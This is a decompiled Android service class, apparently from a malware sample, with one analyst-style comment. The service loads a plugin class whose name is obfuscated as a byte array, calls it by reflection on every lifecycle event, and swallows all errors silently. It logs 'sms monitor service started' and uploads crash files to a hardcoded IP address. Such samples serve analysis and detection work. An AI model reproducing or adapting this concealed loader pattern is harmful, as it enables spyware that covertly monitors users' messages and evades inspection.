package com.yf.y.f.init.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.yf.y.f.init.constant.Constant;
import com.yf.y.f.init.http.UploadUtil;
import com.yf.y.f.init.util.CrashHandler;
import com.yf.y.f.init.util.CustomLog;
import com.yf.y.f.init.util.StringUtils;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
/* loaded from: classes.dex */
public class InitService extends Service {
    private static Object object;
    private CrashHandler crashHandler;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        try {
            Log.i(Constant.CUSTOMERIDENTITY, "InitService onCreate");
            Object obj = getPluginObj(this);
            Method method = obj.getClass().getMethod("registerBroadcast", new Class[0]);
            method.invoke(obj, new Object[0]);
        } catch (Exception e) {
        }
        super.onCreate();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            CustomLog.i("InitService onStartCommand");
            CustomLog.i("sms monitor service started");
            Object obj = getPluginObj(this);
            Method method = obj.getClass().getMethod("startCommand", new Class[0]);
            method.invoke(obj, new Object[0]);
        } catch (Exception e) {
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override // android.app.Service
    public void onDestroy() {
        try {
            CustomLog.i("InitService onDestory");
            Object obj = getPluginObj(this);
            Method method = obj.getClass().getMethod("onDestroy", new Class[0]);
            method.invoke(obj, new Object[0]);
        } catch (Exception e) {
        }
        super.onDestroy();
    }

    private static Object getPluginObj(Context context) {
        if (object == null) {
            try {
                Class serviceActionClazz = Class.forName(StringUtils.byteToString(Constant.serviceActionClassName));
                Constructor constructor = serviceActionClazz.getConstructor(Context.class);
                object = constructor.newInstance(context);
            } catch (Exception e) {
            }
        }
        return object;
    }

    // [fmss] This method gets the content of the file with the latest crash informations from the /crash folder and uploads it 
    // to the url "http://192.168.10.194:8080"
    private boolean uploadCrashFile() {
        this.crashHandler = CrashHandler.getInstance();
        String fileName = this.crashHandler.getLastCrash();
        File file = new File(Constant.FILE_ROOT_DIR, fileName);
        if (!file.exists()) {
            CustomLog.i("yf无crash文件，无需上传");
        } else {
            HashMap<String, String> params = new HashMap<>();
            if (!this.crashHandler.getCrashState()) {
                UploadUtil.uploadFile(file, "http://192.168.10.194:8080", params, "upload");
            }
        }
        return false;
    }
}
